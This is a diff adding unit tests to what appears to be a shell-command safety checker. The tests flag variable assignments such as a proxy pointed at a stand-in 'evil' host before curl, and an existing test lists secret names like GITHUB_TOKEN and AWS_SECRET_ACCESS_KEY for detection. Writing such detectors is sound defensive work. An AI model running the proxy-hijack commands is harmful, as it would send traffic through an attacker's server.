@@ -116,3 +116,23 @@ it("knows a secret's name", () => {
   for (const name of ["GITHUB_TOKEN", "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "API_KEY", "apikey", "NPM_AUTH", "SSH_PRIVATE"]) expect(looksSecret(name)).toBe(true);
   for (const name of ["TEMP", "HOME", "PATH", "e", "d", "EDGE", "MONKEY"]) expect(looksSecret(name)).toBe(false);
 });
+
+describe("an assignment that is not exported (decision 0007 §4, amended 2026-11-25 (later))", () => {
+  const unvouched = (line: string, env?: (name: string) => string | undefined): string[] =>
+    takeApart(line, "posix", [], env !== undefined ? { env } : {}).requests.flatMap((r) => (r.kind === "unvouched" ? [r.reason] : []));
+
+  it("reaches a program only when the environment holds the name already, whatever its case", () => {
+    expect(unvouched("E=/usr/bin/foo; $E x", ENV)).toEqual([]);
+    expect(first("E=/usr/bin/foo; $E x", "posix").program).toBe("foo");
+    expect(unvouched("EDGE=/tmp/x; git status", ENV)).toEqual(["it sets EDGE, which can change what runs after it"]);
+    const proxied = environmentLookupOf({ http_proxy: "http://corp:8080" }, false);
+    expect(unvouched("http_proxy=http://evil:8080; curl https://x", proxied)).toEqual(["it sets http_proxy, which can change what runs after it"]);
+    expect(unvouched("http_proxy=http://evil:8080; curl https://x", ENV)).toEqual([]);
+  });
+
+  it("is guessed from the convention when there is no environment to ask — the proxies too", () => {
+    expect(unvouched("E=/usr/bin/foo; $E x")).toEqual(["it sets E, which can change what runs after it"]);
+    expect(unvouched("f=/usr/bin/foo; $f x")).toEqual([]);
+    expect(unvouched("http_proxy=http://evil:8080; curl https://x")).toEqual(["it sets http_proxy, which can change what runs after it"]);
+  });
+});
